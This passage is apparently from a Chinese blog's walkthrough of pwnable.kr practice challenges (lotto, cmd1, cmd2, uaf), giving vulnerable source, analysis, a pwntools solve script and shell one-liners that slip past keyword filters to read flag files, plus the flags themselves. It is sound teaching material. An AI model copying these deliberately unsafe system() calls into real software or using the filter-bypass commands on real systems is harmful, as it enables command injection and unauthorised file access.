    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Submit your 6 lotto bytes : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">int</span> r<span class="token punctuation">;</span>
    r <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> submit<span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Lotto Start!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">//sleep(1);</span>

    <span class="token comment" spellcheck="true">// generate lotto numbers</span>
    <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/urandom"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>fd<span class="token operator">==</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"error. tell admin\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> lotto<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> lotto<span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"error2. tell admin\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">6</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        lotto<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>lotto<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">%</span> <span class="token number">45</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 1 ~ 45</span>
    <span class="token punctuation">}</span>
    <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment" spellcheck="true">// calculate lotto score</span>
    <span class="token keyword">int</span> match <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">6</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span><span class="token number">6</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>lotto<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> submit<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                match<span class="token operator">++</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token comment" spellcheck="true">// win!</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>match <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bad luck...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">help</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"- nLotto Rule -\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"nlotto is consisted with 6 random natural numbers less than 46\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"your goal is to match lotto numbers as many as you can\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"if you win lottery for *1st place*, you will get reward\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"for more details, follow the link below\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"mathematical chance to win this game is known to be 1/8145060.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

    <span class="token comment" spellcheck="true">// menu</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> menu<span class="token punctuation">;</span>

    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"- Select Menu -\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1. Play Lotto\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"2. Help\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"3. Exit\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>menu<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">switch</span><span class="token punctuation">(</span>menu<span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>
                <span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>
                <span class="token function">help</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>
                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bye\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
            <span class="token keyword">default</span><span class="token punctuation">:</span>
                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"invalid menu\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<h3 id="分析-12"><a href="#分析-12" class="headerlink" title="分析"></a>分析</h3><p>原来这里两层循环来判断提交的值是否<strong>都</strong>在 lotto 中出现，但是逻辑上是有问题的</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">// calculate lotto score</span>
    <span class="token keyword">int</span> match <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">6</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span><span class="token number">6</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>lotto<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> submit<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                match<span class="token operator">++</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span></code></pre>
<p>实际上这段代码是检测提交的值是否在 lotto 中出现，和原来本意有很大的出入，因为我们可以输入 6 同样的值，只要保证这个值在 lotto 里出现即可完成破解</p>
<h3 id="解题-12"><a href="#解题-12" class="headerlink" title="解题"></a>解题</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

conn <span class="token operator">=</span> ssh<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"pwnable.kr"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">2222</span><span class="token punctuation">,</span> user<span class="token operator">=</span><span class="token string">"lotto"</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">"guest"</span><span class="token punctuation">)</span>

p <span class="token operator">=</span> conn<span class="token punctuation">.</span>process<span class="token punctuation">(</span>executable<span class="token operator">=</span><span class="token string">"/home/lotto/lotto"</span><span class="token punctuation">)</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Exit"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"1"</span> <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"bytes :"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>chr<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">6</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"bad luck..."</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<h2 id="14-cmd1"><a href="#14-cmd1" class="headerlink" title="14. cmd1"></a>14. cmd1</h2><h3 id="题目-13"><a href="#题目-13" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>

<span class="token keyword">int</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> cmd<span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">int</span> r<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>
    r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"sh"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>
    r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"tmp"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> r<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> envp<span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"PATH=/thankyouverymuch"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token function">system</span><span class="token punctuation">(</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<h3 id="分析-13"><a href="#分析-13" class="headerlink" title="分析"></a>分析</h3><ul>
<li>strstr：返回字符串str中第一次出现子串substr的地址；如果没有检索到子串，则返回NULL</li>
</ul>
<p>filter 中过滤了三个字符串<code>flag</code>、<code>sh</code>、<code>tmp</code></p>
<p>但是？？？还是没明白和 PATH 的关系</p>
<h3 id="解题-13"><a href="#解题-13" class="headerlink" title="解题"></a>解题</h3><p>通配符直接上，跟题目没太大关系</p>
<pre class=" language-shell"><code class="language-shell">cmd1@pwnable:~$ /home/cmd1/cmd1 "/bin/cat /home/cmd1/f*"
mommy now I get what PATH environment is for :)</code></pre>
<h2 id="15-cmd2"><a href="#15-cmd2" class="headerlink" title="15. cmd2"></a>15. cmd2</h2><h3 id="题目-14"><a href="#题目-14" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>

<span class="token keyword">int</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> cmd<span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">int</span> r<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"="</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>
    r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"PATH"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>
    r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"export"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>
    r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>
    r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"`"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>
    r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> r<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">extern</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> environ<span class="token punctuation">;</span>
<span class="token keyword">void</span> <span class="token function">delete_env</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> p<span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>p<span class="token operator">=</span>environ<span class="token punctuation">;</span> <span class="token operator">*</span>p<span class="token punctuation">;</span> p<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">*</span>p<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token operator">*</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> envp<span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">delete_env</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"PATH=/no_command_execution_until_you_become_a_hacker"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">system</span><span class="token punctuation">(</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<h3 id="分析-14"><a href="#分析-14" class="headerlink" title="分析"></a>分析</h3><p>过滤更彻底，想办法绕</p>
<h3 id="解题-14"><a href="#解题-14" class="headerlink" title="解题"></a>解题</h3><pre class=" language-shell"><code class="language-shell">cmd2@pwnable:~$ cd /
cmd2@pwnable:/$ /home/cmd2/cmd2 '$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)f???'
$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)f???
FuN_w1th_5h3ll_v4riabl3s_haha</code></pre>
<h2 id="16-uaf"><a href="#16-uaf" class="headerlink" title="16. uaf"></a>16. uaf</h2><h3 id="题目-15"><a href="#题目-15" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span> </span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;cstring></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;cstdlib></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
using namespace std<span class="token punctuation">;</span>

class Human<span class="token punctuation">{</span>
private<span class="token punctuation">:</span>
    virtual <span class="token keyword">void</span> <span class="token function">give_shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
protected<span class="token punctuation">:</span>
    <span class="token keyword">int</span> age<span class="token punctuation">;</span>
    string name<span class="token punctuation">;</span>
public<span class="token punctuation">:</span>
    virtual <span class="token keyword">void</span> <span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"My name is "</span> <span class="token operator">&lt;&lt;</span> name <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"I am "</span> <span class="token operator">&lt;&lt;</span> age <span class="token operator">&lt;&lt;</span> <span class="token string">" years old"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

class Man<span class="token punctuation">:</span> public Human<span class="token punctuation">{</span>
public<span class="token punctuation">:</span>
    <span class="token function">Man</span><span class="token punctuation">(</span>string name<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">)</span><span class="token punctuation">{</span>
        this<span class="token operator">-></span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
        this<span class="token operator">-></span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        virtual <span class="token keyword">void</span> <span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        Human<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                cout <span class="token operator">&lt;&lt;</span> <span class="token string">"I am a nice guy!"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

class Woman<span class="token punctuation">:</span> public Human<span class="token punctuation">{</span>
public<span class="token punctuation">:</span>
        <span class="token function">Woman</span><span class="token punctuation">(</span>string name<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">)</span><span class="token punctuation">{</span>
                this<span class="token operator">-></span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
                this<span class="token operator">-></span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        virtual <span class="token keyword">void</span> <span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        Human<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                cout <span class="token operator">&lt;&lt;</span> <span class="token string">"I am a cute girl!"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    Human<span class="token operator">*</span> m <span class="token operator">=</span> new <span class="token function">Man</span><span class="token punctuation">(</span><span class="token string">"Jack"</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    Human<span class="token operator">*</span> w <span class="token operator">=</span> new <span class="token function">Woman</span><span class="token punctuation">(</span><span class="token string">"Jill"</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    size_t len<span class="token punctuation">;</span>
    <span class="token keyword">char</span><span class="token operator">*</span> data<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> op<span class="token punctuation">;</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"1. use\n2. after\n3. free\n"</span><span class="token punctuation">;</span>
        cin <span class="token operator">>></span> op<span class="token punctuation">;</span>

        <span class="token keyword">switch</span><span class="token punctuation">(</span>op<span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>
                m<span class="token operator">-></span><span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                w<span class="token operator">-></span><span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>
                len <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                data <span class="token operator">=</span> new <span class="token keyword">char</span><span class="token punctuation">[</span>len<span class="token punctuation">]</span><span class="token punctuation">;</span>
                <span class="token function">read</span><span class="token punctuation">(</span><span class="token function">open</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">,</span> data<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>
                cout <span class="token operator">&lt;&lt;</span> <span class="token string">"your data is allocated"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>
                delete m<span class="token punctuation">;</span>
                delete w<span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token keyword">default</span><span class="token punctuation">:</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    
<span class="token punctuation">}</span></code></pre>
<h3 id="分析-15"><a href="#分析-15" class="headerlink" title="分析"></a>分析</h3><p>终于到 use-after-free 的题了</p>
<p>学习可以看下这个视频：<a href="https://www.youtube.com/watch?v=ZHghwsTRyzQ" target="_blank" rel="noopener">The Heap: How do use-after-free exploits work? - bin 0x16</a></p>
<p>题目提供了三种操作，分别对用 释放-分配-调用</p>
<ol>
<li>我们先来看下在堆中的结构，首先要确定大小为 24 字节</li>
</ol>
<pre class=" language-armasm"><code class="language-armasm">0x0000000000400efb <+55>:   mov    edi,0x18
0x0000000000400f00 <+60>:   call   0x400d90 <operator new(unsigned long)@plt></code></pre>
<p>在 heap 中我们也能看到分配了长度为0x20的空间，为什么不是0x18呢，是源自 malloc_chunk 时会进行对齐，具体可见这篇文章<a href="https://wiki.x10sec.org/pwn/heap/heap_structure/" target="_blank" rel="noopener">堆相关数据结构</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15916053178506.jpg" alt></p>
<p>通过 chunk 复用存入的结构体如下，可以看到数据分别对应</p>
<ul>
<li>8 (vptr)</li>
<li>8 (int_age)</li>
<li>8 (prt_name)</li>
</ul>
